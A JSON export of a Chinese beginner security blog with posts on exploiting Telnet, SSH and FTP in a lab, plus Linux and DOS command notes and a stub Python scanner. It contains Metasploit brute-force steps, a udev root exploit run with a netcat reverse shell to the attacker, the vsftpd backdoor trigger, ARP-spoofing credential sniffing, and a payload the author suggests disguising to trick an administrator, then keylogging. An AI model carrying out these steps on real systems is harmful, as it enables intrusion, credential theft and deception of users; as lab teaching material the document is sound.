[{"id":"ee30e4a54bdc40c81ca3faa91eadc5d4","title":"Telnet漏洞","content":"\n\nTelnet介绍(直接复制粘贴)  Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。\n  虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。\n  Telnet服务端默认情况下使用23端口。\nTelnet版本获取使用nmap获取telnet版本信息，或者使用metasploit获取对应版本信息。\nnmap -p23 -sV IP地址   #对IP23号端口进行探测\n\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version\nset rhosts IP地址\nrun\n\nTelnet密码破解使用metasploit下针对telnet破解的模块进行用户名和密码的破解。\nmsfconsole\nsearch telnet\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nset rhosts IP地址\nset user_file 字典路径\nset pass_file 字典路径\nset threads 10\nrun\n\nTelnet登录测试使用破解好的账户名和密码进行登录测试，并执行相应的命令。\n接上面的操作\nsessions -l \nsessioms -i id\n\nTelnet客户端连接Telnet服务器Windows下开启telnet客户端，连接telnet服务端。\ncmd\ntelnet\n?      #查看帮助\no 192.168.249.108    #连接服务器,是uio的o\n输入账号\n输入密码\n成功登录\n\nTelnet明文密码传输使用wireshark抓取telnet数据包\n在kali使用arp欺骗win10自己是主机，然后使用win10连接msf\n通过kali的wireshark抓包获取信息，通过分析找出密码，账号。\nmsf登录Telnet在metasploit中使用telnet_login模块进行登录，并使用sessions -i id 连接shell。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nshow options\nset rhosts IP地址\nset username msfadmin\nset password msfadmin\nrun\nsessions -L\nsessions -i 1\n\nmsf连接shell下载exp\n使用wget进行下载\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\n\n但是，这么下载好像不行。所以我们通过kali搭建环境下载。\n再开启一个终端\ncd &#x2F;var&#x2F;www&#x2F;html\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\nmv 8572 test.c    #将8572改为test.c\ncat test.c\nservice apache2 start \n\n然后，我们回到msf会话中\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;    #进行下载\n\n设置kali nc 监听\n使用netcat进行监听，后期返回的shell\nnc -lvp 4444\n\n我们要对程序进行编译执行exp，获取root权限\n再会话中\ngcc test.c -o exploit\n\n这个时候你可能发现有错误，因为c语言在后面要留几行，在kali中的test.c中加上几个空行就行了。\nrm test.c   #先删除会话中下载的test.c\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;\ngcc test.c -o exploit\nls -alh  #查看权限\necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;run\necho &#39;&#x2F;bin&#x2F;netcat -e &#x2F;bin&#x2F;sh kaliIP地址:4444&#39; &gt;&gt; &#x2F;tmp&#x2F;run\nps aux|grep udev    #看到一个root执行\n.&#x2F;expolit 2743   #root执行减一\n\n执行完便可在监听端口执行命令，权限为root。前面有问题直接删除。\nrm /tmp/run\nrm exploit\n有些操作前面写过不截图了，方便。其他操作自己看着办吧。\n\n","slug":"Telnet漏洞","date":"2021-10-24T13:44:27.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"68847bc4d9b92f6bbe7e25411fa69ec3","title":"ssh漏洞利用","content":"\n\nSSH（安全外壳协议）SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。\nSSH安装我们使用ubuntu下载openssh_service服务\nsudo apt-get install openssh-server \n\n完成后使用以下命令开启关闭ssh服务\nservice ssh start #启动ssh服务\nservice ssh status #状态获取\nservice ssh stop  #关闭ssh服务\n\nSSH客户端安装使用ubuntu搭建ssh客户端\nsudo apt-get install putty-tools\n\n然后太ubuntu的软件中心找到putty并且安装，之后使用客户端连接服务端。\nSSH banner信息获取\nnmap获取ssh banner信息\n\nnmap -sV -p 22 IP地址\n\n\nmetasploit获取ssh banner信息\n\nmsfconsole\nuse auxiliary&#x2F;sacnner&#x2F;ssh&#x2F;ssh_version    \nset rhosts IP地址\nset rport 22\nrun\n\n\nnc获取ssh banner 信息\n\nnc IP地址 22\n\n配置ssh规避banner信息在ssh配置文件sshd_config中新增一行\nDebian Banner no  再次扫描就没有操作系统信息\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\ncrtl+f 输入banner 在下面加上\nDebian Banner no  保存\nsevice ssh restart \n\nmedusa ssh 弱口令破解如果在设置ssh服务时，管理员设置了容易破解出来的用户名和密码，那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。\nmedusa\nmedusa -d   #查看支持模块\nmedusa -h IP地址 -u 用户名 -p 字典路径 -M 模块   #进行破解\nsucess表示破解成功\n\nSSH命令行工具登录一般情况下Linux下都具有ssh客户端，用来登陆ssh服务端。可以使用ssh用户名@IP地址，然后根据提示输入密码。（默认22端口）\nssh 用户名@IP地址\n\nmetasploit利用ssh登陆反弹shell使用metasploit可以进行ssh登陆(破解)，会自动建立对应的Bash shell连接。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login\nset rhosts IP地址\nset username xxx\nset password xxx\nrun\n成功后\nsessions -l\nsesssions -i 1\n成功登陆\n\nmetasploit获取meterpreter shell利用获取的Bash shell，注入metasploit中meterpreter payload从而获取更强大功能的shell。\nsessions -u 1\nsessions -i id\n使用后面登陆成功\nhelp  #查看可以使用的命令\n\nSSH安全防御\nssh修改默认端口\n\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\nctrl+f  找端口port\n将端口port修改为其他端口，如：2222\nservice ssh restart  重启ssh服务，使修改生效\n\n\nssh设置pgp登陆\n\n在默认情况下，ssh使用用户名和密码进行远程登陆，但也可以使用密钥对进行身份验证登录。(公钥和私钥)\n生成ssh密钥对，使用puttygen\n下载：https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html  可能不对，直接360下载。ok\n打开puttygen生成私钥，保存到桌面private.ppk。使用ssh-keygen命令在Linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys.并复制私钥文件到.ssh目录下。使用putty -l命令将内容拷贝到authorized_keys中。之后通过putty加载私钥文件进行ssh连接。\nssh-keygen -t rsa  之后一之前确定，自动生成.ssh目录\nls -alh  查看所有文件\ncd .ssh \ntouch authrized_keys   生成文件\n将private.ppk拷贝到.ssh目录下\nputtygen -L private.ppk   查看内容，之后我们将内容复制\ngedit authorized_keys   打开后，我们将复制内容放进去\n\n完成后使用win10刚刚360下载好的putty客户端加载私钥文件进行连接。\n在Auth里加载文件。\n输入IP地址和端口（刚刚已经改为了2222）\n直接连接。\n\nssh防御暴力破解用户账号\n\n在Linux下可以配置不能使用用户名和密码登陆。只使用ssh pgp方式验证登陆。规避了ssh暴力破解。\n问题：不适用用户名和密码登陆，很大程度上存在复杂操作问题。\ncd &#x2F;etc&#x2F;ssh&#x2F;\nsudo gedit sshd_config\nctrl+f  输入password Authentication\n将yes改为no  保存退出\nservice ssh restart  重启服务\n\n\nIptable设置阈值防止暴力破解\n\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -mrecent --set\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -m recent --updata --seconds 120 --hitcount 3 -jDROP  #3次密码不对就暂停连接120秒，也可修改时间\nservice ssh restate  #重启服务\n\n表示连接3次不对，停止接收数据包防止暴力破解。最好还是要设置复杂密码，防止被字典跑出来。\n毕竟我曾经在群里看到一个变态跑了一年跑出来了。。。。。。。\n因为安全方面设置好了，前面就没有截图。不过步骤都写的很清楚了。。。\n\n","slug":"ssh漏洞利用","date":"2021-10-15T10:06:04.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"add830c1c066eef908d48bdb9bf71238","title":"FTP漏洞利用","content":"\n\n​                                     开始记录一个安全漏洞利用\nFTP协议文件传输协议(英文：File Transfer Protocol)。是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。\nFTP用户分类\nReal    一般用户   \n\nAdministrator  管理员\n\nAnonymous    匿名用户\n\n\nFTP文件传输格式\nASCII\n二进制格式\n\n利用FTP匿名登陆漏洞由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。使用nc连接FTP。\n本次靶机是windows2003企业版     攻击机为kali\n\n打开kali终端切换到root用户，使用kali自带nmap进行目标端口扫描看是否开启FTP服务\n\nnmap IP地址   \n\n\n扫描完成，发现开启了21号端口\n\n使用nmap进行漏洞扫描\n\nnmap --script vuln -p 21 IP地址    #漏洞扫描，p表示端口号，script表示脚本\n\n\n显示有匿名登陆漏洞，直接使用nc测试。\n\n使用nc进行FTP登陆\n\nnc IP地址 21   #进行连接\nUSER anonymous   #输入用户名为匿名用户\nPASS 123  #密码为123\n回车登陆\npwd   #查看当前目录\n\n\n成功登录靶机。\n利用FTP后门漏洞vsftpd手工触发漏洞，当进行FTP认证时，如果用户名中包含:)，那么直接就触发监听6200端口连接的shell。\n本次靶机Metasploittable2-Linux     攻击机kali\n这个漏洞是特定版本才有的，先用nc直接连接，看看是不是有漏洞的版本\n\nnc连接\n\nnc 192.168.249.108 21    #连接靶机\nUSER use:)    #触发漏洞\nPASS 123   #密码随便输入\n\n\n发现成功触发，并没有显示连接失败。接下来打开另一个终端直接连接6200端口\n\nnc连接后门\n\nnc 192.168.249.108 6200   #连接触发的后门\nid    #连接成功后，查看当前用户\n\n\n成功连接后门，并且拥有root权限。\nFTP安全配置\n修改配置文件，禁止匿名登录\n在windows中打开服务器管理，找到FTP，选择属性–&gt;安全—&gt;将允许匿名登陆的勾去掉\n在Linux中找到vsftpd.conf文件，打开找到allow_anonymous将其设置为no或者其他相应否定词\n\n对特定漏洞进行打补丁或者设置防火墙禁止连接后门端口\n打补丁直接更新版本就行\n禁止连接看下面的命令\niptables -A INPUT -p tcp -dport 6200 -j DROP\niptacles -A OUTPUT &#x3D;p tcp sport 6200 -j DROP\n\nFTP用户名密码暴力破解Windows下cmd命令添加用户，并提升为Administrator管理员权限\nnetuser 用户名 用户密码 &#x2F;add   #添加用户\nnet localgroup administrators admin &#x2F;add  #添加到管理员组\n\nWindows下使用FTP服务器添加用户操作\n打开IIS服务，找到FTP，添加用户\n使用medusa暴力破解FTP登录\n本次靶机Windows2003企业版    攻击机kali\nmedusa -d    #查看可以使用的模块\n\n\n发现有FTP模块，利用FTP模块进行暴力破解\nmedusa -h 192.168.249.109 -u admin -P 字典路径 -M ftp   #使用ftp模块，用户名admin，密码用字典进行破解\n\n\n破解成功，发现用户名admin，密码admin测试登录看看。\n\n成功利用破解的用户名和密码登录。\nFTP用户名明文密码的验证FTP协议中用于用户认证的过程中，客户端与服务器端是通过明文进行叫交互信息，验证FTP登录过程中明文传输用户名和密码可以使用wireshark进行抓包分析。\n打开kali的wireshark，在过滤器填写ftp回车，一定要回车不然不会过滤。然后鼠标双击eth0选择抓取的网卡。\n\n接着在终端使用nc进行FTP连接，连接完成后对抓取的数据包进行分析。我们查看本机对连接机发送的数据包，本机ip为192.168.249.112，连接机ip为192.168.249.109.\n\n\n发现明文暴露出连接账户和密码信息，成功验证。\nFTP用户名密码明文嗅探刚刚上面讲到FTP在登陆时是使用明文传输，没有进行加密的。那我们如何进行利用呢？\n我们可以是用arpspoof进行ARP嗅探，就是我们利用脚本对我们进行连接FTP服务器的客户机进行欺骗，使客户机以为我们是网关路由器。欺骗成功后，客户机对网关发送到信息就会被我们接收到然后在传送给路由网关。\n打开终端使用arpspoof脚本\narpspoof -i eth0 192.168.249.1 -t 192.168.249.102   #客户机为102\n\n欺骗开始后不要动。。。。。。\n打开本机win10，在cmd中使用arp -a 。来查看网关的MAC地址是不是kali的MAC地址，若是则代表欺骗成功。\n打开kali另一终端，输入命令：ifconfig   查看mac地址\n再到win10中查看网关mac地址\n00:xx:xx:xx:xx:b0    #kali的MAC地址\n00-50-xx-xx-xx-b0     #win10中网关地址\n\n发现一样，欺骗成功。\n在win10中使用ftp登陆win2003，在kali中使用wireshark抓取数据包，并进行分析。\nftp IP地址    #登录到IP地址的ftp服务\n输入用户名  \n输入密码   \n\n登陆完成后，查看wireshark中中抓取的数据包。\n\n\n成功获得用户名和密码。。。。。。\nFTP登陆之后的事情讲了那么多，那么我们利用漏洞登陆之后该怎么做呢？我们可以利用metasploit建立反弹shell上传到FTP服务器。可以利用setoolkit快速生成反弹shell。\nmsfconsole   #打开msf\nsetoolkit  #使用setoolkit\n1      #选择一些模块，包括后面的\n4\n2\nkali的IP地址\n端口    #后门端口号，设置完成之后立刻生成payload并且询问是否开始监听\nyes   #开始监听\n\n生成的payload在/root/.set里面\ncd &#x2F;root&#x2F;.set   #进入目录\nls   #查看文件\nmv payload.exe &#x2F;home&#x2F;xxx&#x2F;桌面&#x2F;   #将payload移动到桌面\n\n之后我们可以使用任意FTP客户端连接服务器，然后将生成的payload上传到服务器。当然上传之前可以将payload改名和改显示图片，让人看了就忍不住点击打开的哪一种。当管理人员点击打开后，kali中立马会收到会话。\nsessions -l   #查看会话\nsessions -i x  #选择连接x号会话\n\nhelp   #查看帮助\nsysinfo   #查看系统信息\nkeyscan_start    #开启键盘输入记录\nkeyscan_dump   #查看键盘记录\n\n\n键盘输入情况演示\n因为图片加载不出来，自己试试看就知道了，这边就不放图片了。\n当然，还有很多操作可以自己试一试。在进行前最好建立快照，一不小心搞了破坏也方便恢复嘛！！！\n防御\n禁止匿名用户登陆\n及时更新版本，防止老版本漏洞\n设置连接次数防止暴力破解\n密码明文，所以最好不适用FTP，用其他类似替代\n\n\n","slug":"FTP漏洞利用","date":"2021-10-07T07:38:38.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"5edbb0bb0225a5f787cc77b6741890ba","title":"Linux命令","content":"\n\nLinux命令学了好久了，还是不好记住，写个笔记方便查看吧。\n\nRed Hat专属快捷键ctrl+alt+F2   #切换为字符界面(F2~F7个命令行界面)\nctrl+alt+F1   #切换为图形界面\n\n基础命令快捷键反斜杠\\    #强制换行\nTAB    #自动补齐\nCTRL+U  #清空至行首\nCTRL+K  #清空至行尾\nCTRL+L  #清屏\nCTRL+C  #取消本次命令编辑\nxx --help  #查看xx的帮助信息\nman ls   #查看帮助\nuname -r  #查看内核\nuname -a  #查看系统\nwhich uname #当前目录\nhostname   #查看主机名\nifconfig  #查看网卡信息\ncat &#x2F;proc&#x2F;cpuinfo   #查看cpu信息\ncat &#x2F;proc&#x2F;meminfo   #查看内存信息\nreboot  #重启\nshutdown -h now   #立刻关机\npwd   #查看当前目录\n\ncd命令   切换目录cd    #切换目录\ncd &#x2F;etc&#x2F;httpd    #绝对路径\ncd abc    #相对路径\n\nls命令   查看文件ls  #查看目录的文件\nls -l  #详细查看\nls -a  #查看全部文件\nls -h  #察看文件大小\nls -alh  #就上面全部\n\ndu命令   查看文件大小du  #查看当前文件夹大小\ndu -a   #统计时包括所有文件，不仅仅只统计目录\ndu -h   #以更易读懂的字节单位(k,m等)显示信息\ndu -s   #只统计每个参数所占用的空间总的大小\n\nmkdir命令   创建目录mkdir   #创建新目录\nmkdir -p &#x2F;路径名&#x2F; 目录名   #创建目录\n\ntouch命令  创建文件touch  #新建空文件或更新文件时间标记\ntouch 文件名  #新建文件\n\nln命令   建立连接ln    #为文件或目录建立链接(link)\nln -s 源文件或目录 -----&gt; 链接目录   #创建链接\n-s表示建立符号链接文件(省略此项则建立硬链接)\n\ncp命令   复制文件cp   #复制文件或目录\ncp 【选项】 源文件目录 目标文件目录  \n-r  #递归复制整个目录\n-f   #强制覆盖目标同名文件或目录\n-p   #保持源文件的属性不变\n-i   #需要覆盖文件或目录时进行提醒\n\nrm命令   删除文件rm   #删除\nrm 【选项】 文件目录\n-f  #强制删除文件&#x2F;目录,不进行提醒\n-i  #删除文件或目录时提醒用户确认\n-r  #表示递归\n\nmv命令   移动文件mv 【选项】 源文件&#x2F;目录 目标文件&#x2F;目录   #移动文件\n-b   #当目标文件或目录存在时，在执行覆盖前，会为其创建一个备份。\n-i   #如果指定移动的源目录或文件与目标的目录或文件同名，则会先询问是否覆盖旧文件，输入 y 表示直接覆盖，输入 n 表示取消该操作。\n-f   # 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。\n-n   #不要覆盖任何已存在的文件或目录。\n-u   #当源文件比目标文件新或者目标文件不存在时，才执行移动操作\n\nfind命令     查找文件find   #用于查找文件或目录\nfind 查找范围 查找文件\n-name  #按照文件名查找\n-size #按照文件大小查找\n-uesr #按照文件属主查找\n-type #按照文件类型查找\n\nvi命令   编辑文件vi   #表示进入\nvi 【选项】 【t[n]】 【file】\n-r   #用于恢复系统忽然崩溃时正在编辑的文件\n-R   #用于只读方式打开文件\n+n   #用来指明进入vi后直接位于文件的第几行，如不指定n则位于最后一行\na  #在光标后附近文本\nA  #在本行行末附加文本\ni  #在光标前插入文本\nI  #在光标开始时插入文本\no  #在光标下插入新行\nO  #在光标上插入新行\n&#x2F;string 向下 向前搜索指定字符串搜索时忽略大小写\n？  向上\nn  搜索指定字符串的下一个出现位置\n:%s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #全文替换为指定字符串，g表示不提示，s表示搜索，%表示全部\n:n1,n2s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #在一定范围替换指定字符串，n1到n2行\nU  #返回的上一步\n:set nu   #显示行号\n:q    #直接退出\n:wq   #保存后退出\n:q!   #强制退出\n:.   #重复上一个命令\nD   #光标到行尾全部删除\ndd   #删除光标在的那一行\np   #粘贴dd删除的那一行\n\ncat命令   查看文件cat   #显示文件的全部内容\n-n   #给输出的所有行加上编号\ncat 1 2 &gt; 3   #合并文件\n\nwc命令    统计文件内容wc   #统计文件中的单次数量字节数行数\n-I  #统计行数\n-w  #统计单词数\n-c  #统计字符数\nwc sdxh.txt   #会出现 2 4 26,2是行数，4是单词数，26是字符数\nhistory   #查看历史命令\n\ngzip和bzip2命令  压缩文件gzip   bzip2   #都是归档和压缩文件命令\n只针对单个文件压缩\n-g   #显示高压缩比\n-d   #释放压缩文件\ngzip 文件名 压缩文件     #格式为后缀有.gz\nbzip2 文件名 压缩成的文件名  #格式为 文件.bz2,他相对于gzip压缩率更高\n\ntar命令   解压压缩文件tar\ntar -tvf 4.tar -r   #追加TAR文件到归档结尾\ntar -rvf 4.tarr 5   #把5加入到4.tar\n-p  #解包时保留原始文件及目录的权限\n-C  #解包时指定释放的目录文件夹\n-z  #调用gzip程序进行解压或压缩\n-j  #调用bzip2程序进行解压或压缩\ntar -cvzf test.ter.gz 被压缩的文件1 被压缩的文件2   #创建归档压缩文件后缀为bz2\ntar -xvzf test.tar.gz -C &#x2F;usr&#x2F;src  #解压释放归档到&#x2F;usr&#x2F;src里面\ntar -xvjf test.tar.bz2 -C &#x2F;usr&#x2F;src   #解压释放归档到&#x2F;usr&#x2F;src里面\n-c   #创建归档文件扩展名为.tar\n-v   #输出详细信息\n-f   #表示使用归档文件    如-cvf   创建归档文件\ntar -cvf 4.tar 1 2 3   #将文件1 2 3 打包归档为4.tar\ntar -xvf 4.tar    #解包归档文件4.tar\n-xvf   #解包归档文件\n-x    #解开归档文件\n-t    #列表查看包内文件(不释放解包)\n\nchmod 命令   修改权限chmod 777 文件名   #提升权限\nr     #4  表示读\nw    #2  表示写\nx    #1  表示可执行 \n777   #表示任何人都拥有所有权限\n\n编译安装过程下载源代码安装文件包文件\n1： tar解包\n2： .&#x2F;configure配置\n3： make编译\n4： make install 安装\n\napt-get命令   安装apt-get install xxx   #安装xxx,直接从网上下载\ndpkg -i xx   #安装xx，Debian软件包\ndpkg -l xx   #列出与xx有关软件\ndpkg -r xx   #删除\n\nuseradd命令   添加用户useradd [选项] 用户名\n-u  #指定uid标记号\n-d  #指定宿主目录\n-e  #指定账号失效时间\n-g  #指定用户的基本组名(或uid号)\n-G  #指定用户的附加组合名(或Gid号)\n-M  #不为用户建立并初始化宿主目录\n-s  #指定用户的登录shell\n\nuserdel命令    删除账号userdel -r 用户名   #表示连用户的宿主目录一并删除\n\nifconfig命令   查看网络接口信息-eth0   #以太网，局域网\n-lo    #(虚拟)回环设备\nppp0   #使用ppp协议的串口设备(通常指调制调解器)\ntr0   #令牌环(Token Ring)\nfddi0  #光纤\nifdown eth0  #禁用网络接口\nifup eth0   #启用网络接口\n\nnetstat命令   查看网络连接情况netstat [选项]\n-a  #显示所有活动连接\n-n  #以数字形式显示\n-p  #显示进程信息\n-t  #查看tcp协议相关信息\n-u  #查看udp协议相关信息\n-r  #显示路由表信息\n\nroute命令     查看路由表条目route [选项]\n-n   #查看路由表条目\nroute del default gw IP地址   #删除路由表中的默认网关记录\nroute add default gw IP地址   #像路由表添加默认网关记录\nroute add -net 网段地址&#x2F;24 gw IP地址  #添加到指定网段的路由记录\nroute del -net 网段地址&#x2F;24 gw IP地址  #删除到指定网段的路由记录\n\nseivice命令    服务命令service xx start  #启动xx服务\nservice network restart  #重启network网络服务\nservice xx stop   #关闭xx服务\n\n基本上会上面这么多就差不多了。放个链接地址方便继续学习：https://www.linuxcool.com/\n","slug":"Linux命令","date":"2021-09-26T10:03:35.000Z","categories_index":"Linux基础","tags_index":"Linux命令","author_index":"Longw"},{"id":"08b6393a58e95b9436d0c70886fad74f","title":"DOS命令","content":"\n\n常用的DOS命令身为IT人士，怎么能对windows的基本命令不知道呢？来跟我一起学习一下。\n\n来！我们win+r输入cmd进去：\n\n入门命令这黑白对比不是太好看。看一下第一条命令，教你怎么变色;\ncolor  【选项】       # 改变cmd字体颜色\n\ncolor -h   #查看帮助\n\n\n都是中文应该都看得懂的，不懂我们试试嘛：\ncolor a      #变成绿色\n\n\n我靠，兄弟你绿了!\n\n\n这下这条命令都懂了，改变颜色，选项能用 -h  查看。想变什么颜色自己选，嘿嘿嘿！！！\n上面的字有点多，看起来不是太舒服，来看一下清屏命令：\ncls     #清空前面命令页面\n\n\n可以看到鼠标不能往上拉了，说明以前的命令等已经被清空了。下面我们进入重点。\n常用的DOS命令ping命令ping   IP&#x2F;域名     #尝试能否链接此IP&#x2F;域名\n\nping baidu.com     #尝试是否能访问百度，最常用来查看网络是否接通\n\nping -t -I 65500:IP   #死亡之ping，发送大量数据包\n\nipconfig命令常用ipconfig     #帮助用户查看网络状况，如延迟、IP、主机信息、物理地址信息等\n\nipconfig&#x2F;all  #显示本机TCP&#x2F;IP配置的详细信息\n\nipconfig &#x2F;release #DHCP客户端手工释放IP地址\n\nipconfig &#x2F;renew   #DHCP客户端手工向服务器刷新请求\n\n\n不常用ipconfig &#x2F;flushdns  #清除本地DNS缓存内容\n\nipconfig &#x2F;displaydns  #显示本地DNS内容\n\nipconfig &#x2F;registerdns   #DNS客户端手工向服务器进行注册\n\nipconfig &#x2F;showclassid   #显示网络适配器的DHCP类别信息\n\nipconfig &#x2F;setclassid   #设置网络适配器的DHCP类别\n\nipconfig &#x2F;renew “Local Area Connection”  #更新“本地连接”适配器的由 DHCP 分配 IP 地址的配置\n\nipconfig &#x2F;showclassid Local*  #显示名称以 Local 开头的所有适配器的 DHCP 类别 ID\n\nipconfig &#x2F;setclassid “Local Area Connection” TEST #将“本地连接”适配器的 DHCP 类别 ID 设置为 TEST\n\n关于文件/目录的命令目录查看及跳转dir    #查看目录\npwd   #查看当前路径\ncd 目录  #切换到指定目录\nd:    #进入d盘，这个不用cd\ncd ..  #返回上级目录\ncd &#x2F; #跳转到根目录\nhelp cd  #查看cd命令详细信息\ntree    #列出路径中文件树形结构\n\n文件/目录创建及删除copy con d:123.txt   #创建123.txt文件\n立马进入输入模式：hello world\n输入完成按CTRL+z  再按回车退出输入模式\nmd 目录名    #创建目录\nrd 目录名    #删除文件夹\ndel 文件名   #删除文件\n\n文件的查看start 文件名   #按照默认打开方式打开查看，也能打开网页等，如:start www.baidu.com\ntrpe 文件名     #在命令行查看\n\n文件的移动copy 文件 移动目录    #复制文件到移动目录中\nmove 文件 移动目录   #将文件移动到相应目录中\n\n文件重命名ren 原文件名 新文件名        #重命名文件\n\n系统命令systeminfo   #查看系统信息\n\narp命令arp -a   #用于查看高速缓存中的所有项目\narp -a IP  #只显示与该接口相关的ARP缓存项目\narp -s IP 物理地址 #人工配置的物理地址将自动更新该项目\narp -d IP   #使用本命令能够人工删除一个静态项目\n\nshutdown命令shutdown -s -t 180 -c “关机”    #定时关机，并提示\nshutdown -a   #取消计划关机\n\nnet命令net view    #查看局域网内吉他计算机的名称\nnet start    #查看开启了哪些服务\nnet start 服务名   #开启服务(如：net start telent)\nnet stop 服务名   #停止服务\nnet use k:\\\\IP\\c$  #映射目标IP到本地k盘\nnet use k:\\\\IP\\c$&#x2F;del   #断开映射\nnet user 用户名 密码 &#x2F;add   #建立用户\nnet suer 用户名 &#x2F;del   #删除用户\nnet user guest&#x2F;active:yes    #激活guest用户\nnet user #查看有哪些用户\nnet user 账户名  #查看账户属性\nnet localgroup administrators 用户名 &#x2F;add   #把“用户”添加到管理员中\nnet user guest 12345 #用guest登陆后将密码改为12345\nnet password 密码  #更改系统登录密码\nnet share  #查看本地开启的共享\nnet share ipc$   #开启ipc$共享\nnet share ipc$ &#x2F;del   #删除ipc$共享\nnetstat -a   #查看端口\nnetstat -n   #查看端口的网络连接情况\nnetstat -v    #查看正在进行的工作\n\nat命令at id号   #开启已注册的某个计划任务\nat &#x2F;delete #停止所有计划任务用参数&#x2F;yes则不需确定就直接停止\nat id号 &#x2F;delete  #停止某个已注册的计划任务\nat #查看所有计划任务\nattrib 文件名(目录名) #查看某文件或目录的属性\nattrib 文件名 -A -R -S -H 或 +A +R +S +H   #去掉(添加)某文件的存档，只读，系统，隐藏属性\n\n批处理文件就是将一些DOS命令写好，并将其放到后缀为.bat的文件里。\n计划命令太多了，不写了查看这个连接就行：https://blog.csdn.net/weixin_34128237/article/details/93049391\n\n","slug":"DOS命令","date":"2021-09-26T10:03:04.000Z","categories_index":"windows基础","tags_index":"DOS命令","author_index":"Longw"},{"id":"8144d90f97aac2df03b3e52cffae8156","title":"开发网络扫描器","content":"\n\n用Python开发网络扫描器网络扫描器简介我们直接看百度的结果：\n​         迅速发展的Internet给人们的生活、工作带来了巨大的方便，但同时，也带来了一些不容忽视的问题，网络信息的安全保密问题就是其中之一。　　网络的开放性以及的是造成网络不安的主要原因。科学家在设计Internet之初就缺乏对安全性的总体构想和设计，我们所用的TCP/IP 协议是建立在可信的环境之下，首先考虑的是网络互连，它是缺乏对安全方面的考虑的。而且TCP/IP协议是完全公开的，远程访问使许多者无须到现场就能够得手，连接的主机基于互相信任的原则等等这一些性质使网络更加不安全。　　先进的技术是实现网络信息安全的有力武器，这些技术包括:密码技术、身份验证技术、访问控制技术、安全内核技术、网络反病毒技术、信息泄漏防治技术、防火墙技术、网络安全漏洞扫描技术、检测技术等。而在系统发生安全事故之前对其进行预防性检查，及时发现问题并予以解决不失为一种很好的办法，于是网络安全漏洞扫描技术应运而生。\n用Python编写网络扫描器程序话不多说，直接干，首先了解一下scapy这个库的ARP模块：\n#!&#x2F;usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n# @Time :2021-09-15 14:15\n# @Author : longw\n# @File : network_scanner_argparse.py\n# @Software : PyCharm\n\n\nimport scapy.all as scapy\n\ndef scan(ip): # 广播ip地址\n\tscapy.arping(ip) \n\nscan(&quot;192.168.253.2&quot;)  #路由地址\n\n\n想要知道路由地址，直接在Linux主机终端输入：\nroute -n\n\n来看下程序执行结果：\n图片1……………正在输入中。。。。。。。","slug":"开发网络扫描器","date":"2021-09-20T10:54:58.000Z","categories_index":"开发网络扫描器","tags_index":"payload","author_index":"Longw"},{"id":"f125174ab074d2773620490648712dee","title":"修改MAC地址","content":"\n\n通过Python修改Linux主机的MAC地址为什么要修改MAC地址进行渗透测试时，可以修改mac地址来绕过某些验证。。。。。。。\n\n我们先来看一下MAC地址，我们输入：\nifconfig\n\n\n这个ether后面的就是我们的MAC地址，MAC地址的长度为48位(6个字节)，通常表示为12个16进制数。\n通过ifconfig指令修改MAC地址先来看下如何通过ifconfig指令来修改MAC地址，输入：\nifconfig eth0 down    #用来关闭网络连接\nifconfig eth0 hw ether 00:11:22:33:44:44    #修改MAC地址为00:11:22:33:44:44\nifconfig eth0 up   